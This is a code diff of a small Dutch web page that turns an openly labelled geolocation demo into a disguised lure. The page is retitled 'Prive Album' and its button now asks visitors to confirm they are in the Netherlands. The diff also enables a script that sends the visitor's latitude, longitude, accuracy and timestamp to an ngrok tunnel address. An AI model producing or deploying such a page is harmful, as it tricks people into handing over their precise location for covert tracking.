@@ -11,10 +11,10 @@
   </style>
 </head>
 <body>
-  <h1>Trace It — Locatie Demo</h1>
+  <h1>Prive Album</h1>
   <p>Klik op de knop, geef toestemming en je ziet je coördinaten op het scherm.</p>
 
-  <button id="btn">Klik hier om locatie te delen</button>
+  <button id="btn">Klik aub hier om te bevestigen dat u zich bevind in Nederland</button>
   <p id="output">Nog geen locatie.</p>
 
   <script>
@@ -37,19 +37,22 @@
 
         output.textContent = `Latitude: ${lat}\nLongitude: ${lon}\nNauwkeurigheid (m): ${accuracy}\nTimestamp: ${ts}`;
 
-        // Optioneel: verstuur naar je server (comment/uncomment)
-        /*
+        // Verstuur naar je server
         try {
-          await fetch('https://JOUW_SERVER_HIER/receive', {
+          await fetch('https://hydrometallurgical-arla-hurryingly.ngrok-free.dev/send', {
             method:'POST',
             headers:{'Content-Type':'application/json'},
-            body: JSON.stringify({latitude: lat, longitude: lon, accuracy, timestamp: pos.timestamp})
+            body: JSON.stringify({
+              latitude: lat,
+              longitude: lon,
+              accuracy: accuracy,
+              timestamp: pos.timestamp
+            })
           });
-          console.log('Verzonden naar server');
+          console.log('Verzonden naar server ✔');
         } catch(e) {
-          console.warn('Versturen mislukt', e);
+          console.warn('Versturen mislukt ❌', e);
         }
-        */
 
       }, (err) => {
         switch(err.code) {
@@ -62,9 +65,6 @@
     }
 
     btn.addEventListener('click', getLocation);
-
-    // Optioneel: auto-trigger bij laden (kan irritant zijn)
-    // window.addEventListener('load', () => setTimeout(getLocation, 500));
   </script>
 </body>
 </html>
